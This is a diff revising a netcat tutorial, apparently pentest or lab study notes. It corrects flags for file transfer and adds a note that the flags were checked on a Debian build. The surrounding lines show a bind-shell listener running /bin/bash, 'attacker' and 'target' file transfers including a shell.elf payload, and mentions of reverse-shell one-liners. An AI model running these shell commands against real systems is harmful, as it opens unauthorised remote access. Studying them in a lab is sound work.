@@ -116,7 +116,7 @@ Netcat moves files with plain stdin/stdout redirection.
 nc -lvnp 4444 > received.tar.gz
 #   Target:
 nc -w 3 10.0.0.5 4444 < data.tar.gz
-#   (OpenBSD nc: use -q 1 instead of -w so it closes after EOF)
+#   (OpenBSD nc: add -N to shut the socket down after EOF; -q is not in upstream OpenBSD nc)
 
 # ncat: cleaner half-close behavior
 #   Attacker:
@@ -133,7 +133,7 @@ nc -w 3 10.0.0.6 4444 < shell.elf
 
 Netcat gives **no progress bar and no integrity check** — verify with `md5sum` or
 `sha256sum` on both ends, and be careful the file is not truncated (that is what
-`--send-only` / `-q` fix).
+`-N` / `--send-only` fix).
 
 ## Simple port scanning
 
@@ -188,8 +188,8 @@ ncat -k -lvnp 4444 -e /bin/bash
   named-pipe one-liner, `ncat -e`, or the bash `/dev/tcp` one-liner instead.
 - **Wrong IP direction.** In a reverse shell the *target* dials your `LHOST`; in a bind
   shell *you* dial the target. Double-check who listens where.
-- **File transfer truncation.** Without `-q`/`--send-only` the connection may hang or cut
-  early. Always checksum the file afterward.
+- **File transfer truncation.** Without `-N` (OpenBSD nc) or `--send-only` (ncat) the connection
+  may hang or cut early. Always checksum the file afterward.
 - **Plaintext traffic.** Classic netcat sends everything in cleartext — fine in an
   isolated lab, but use `ncat --ssl` when privacy matters.
 - **Interactive shell pain.** A raw `nc` shell has no PTY; run the `python3 -c 'import
@@ -208,6 +208,11 @@ ncat -k -lvnp 4444 -e /bin/bash
 - [ ] I can transfer a file in both directions and verify it with a checksum.
 - [ ] I can use `ncat --ssl` and `ncat -k` and explain when to use them.
 - [ ] I know at least one `-e`-free reverse-shell technique.
+
+> **Verification:** executed on 2026-09-19 — OpenBSD netcat (Debian patchlevel 1.226-1ubuntu2) is
+> installed here and `nc -h` confirms the flags above; it also accepts `-q`, which this Debian-patched
+> build adds, while the upstream page this note links (<https://man.openbsd.org/nc.1>) documents `-N`
+> and carries no `-q`, so the transfer examples cite `-N`. `ncat` is not installed — not run.
 
 ## Further Resources
 
